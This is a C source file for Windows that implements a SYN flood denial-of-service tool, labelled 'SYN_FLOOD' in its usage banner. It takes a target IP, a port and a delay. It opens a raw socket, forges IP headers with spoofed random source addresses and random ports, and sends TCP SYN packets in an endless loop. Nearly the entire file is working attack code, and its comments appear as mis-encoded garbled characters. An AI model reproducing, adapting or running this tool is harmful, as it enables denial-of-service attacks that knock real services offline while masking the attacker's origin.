
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "header.h"

#pragma comment(lib, "ws2_32.lib")


//����У��͵��Ӻ���
USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;
	while(size > 1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if(size)
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return (USHORT)(~cksum);
}

void usage()
{
	printf("***********************************************************\n");
	printf("SYN_FLOOD MADE BY LionD8 & Shepherdog\n");
	printf("Useage: FLOOD Target_ip Target_port Delay_time \n");
	printf("***********************************************************\n");
}
//Delay_time��λΪ����


int main(int argc, char* argv[])
{
	WSADATA WSAData;
	SOCKET sock;
	SOCKADDR_IN addr_in;
	IPHEADER ipHeader;
	TCPHEADER tcpHeader;
	PSDHEADER psdHeader;
	int SourcePort;
	char szSendBuf[60] = {0};
	char szTcpBuf[40] = {0};
	int flag;
	int rect, nTimeOver;
	int sleeptime;
	
	usage();
	if(argc<3 || argc>4 )
	{
		printf("Input Error! ");
		return 0;
	}
	if(argc == 4)
	{
		sleeptime = atoi(argv[3]);
	}
	else
	{
		sleeptime = 300;
	}
	
	if(WSAStartup(MAKEWORD(2,2), &WSAData) != 0)
	{
		printf("WSAStartup Error!");
		return 0;
	}
	
	//����ԭʼ�׽���
	sock = NULL;
	if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_IP)) == INVALID_SOCKET)
	{
		printf("Socket Setup Error!");
		return 0;
	}
	
	//�趨IP��ͷ����
	flag = 1;
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) == SOCKET_ERROR)
	{
		printf("setsockopt IP_HDRINCL error!");
		return 0;
	}
	
	//���÷�����ʱ
	nTimeOver = 1000;
	if(setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&nTimeOver, sizeof(nTimeOver)) == SOCKET_ERROR)
	{
		printf("setsockopt SO_SNDTIMEO error!");
		return 0;
	}
	
	addr_in.sin_family = AF_INET;
	addr_in.sin_port = htons(atoi(argv[2]));
	addr_in.sin_addr.S_un.S_addr = inet_addr(argv[1]);
	
	while(1)
	{
		//���IP�ײ�
		ipHeader.h_verlen = (4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
		ipHeader.tos = 0;
		ipHeader.total_len = htons(sizeof(ipHeader)+sizeof(tcpHeader)); //IP�ܳ���
		ipHeader.ident = 1;
		ipHeader.frag_and_flags = 0; //�޷�Ƭ
		ipHeader.ttl = (unsigned char)GetTickCount()%87+123;
		ipHeader.proto = IPPROTO_TCP; // Э������ΪTCP
		ipHeader.checksum = 0; //Ч��λ�ȳ�ʼΪ0
		ipHeader.sourceIP = htonl(GetTickCount()*474695); //�������һ��α���IP
		ipHeader.destIP = inet_addr(argv[1]); //Ŀ��IP
		
		//���TCP�ײ�
		SourcePort = GetTickCount()*43557%9898; //�������һ���˿ں�
		tcpHeader.th_dport = htons(atoi(argv[2])); //���͵�Ŀ�Ķ˿�
		tcpHeader.th_sport = htons(SourcePort); //Դ�˿ں�
		tcpHeader.th_seq = htonl(0x12345678); //���к�
		tcpHeader.th_ack = 0; //ȷ�Ϻ�
		tcpHeader.th_lenres = (sizeof(tcpHeader)/4<<4|0);
		tcpHeader.th_flag = 2; //ΪSYN����
		tcpHeader.th_win = htons(512);
		tcpHeader.th_urp = 0;
		tcpHeader.th_sum = 0;
		
		//���TCPα�ײ���������TCPͷ����Ч���
		psdHeader.saddr = ipHeader.sourceIP;
		psdHeader.daddr = ipHeader.destIP;
		psdHeader.mbz = 0;
		psdHeader.ptcl = IPPROTO_TCP;
		psdHeader.tcpl = htons(sizeof(tcpHeader));
		
		//����У���
		memcpy(szTcpBuf, &psdHeader, sizeof(psdHeader));
		memcpy(szTcpBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
		tcpHeader.th_sum=checksum((USHORT *)szTcpBuf, sizeof(szTcpBuf));
		
		//��α��õ�IPͷ��TCPͷ�Ž�buf׼������
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
		memcpy(szSendBuf+sizeof(ipHeader), &szTcpBuf, sizeof(szTcpBuf));
		
		//�������ݰ�
		rect = sendto(sock, szSendBuf, sizeof(szSendBuf), 0, (struct sockaddr*)&addr_in, sizeof(addr_in));
		if(rect == SOCKET_ERROR)
		{
			printf("Send Error:%x", WSAGetLastError());
			return 0;
		}
		else
		{
			//printf("Send OK!");
		}
		Sleep(sleeptime);
	}//endwhile //����α��IP��Դ��ַ���ٴ���Ŀ�귢��
	
	closesocket(sock);
	WSACleanup();
	return 0;
}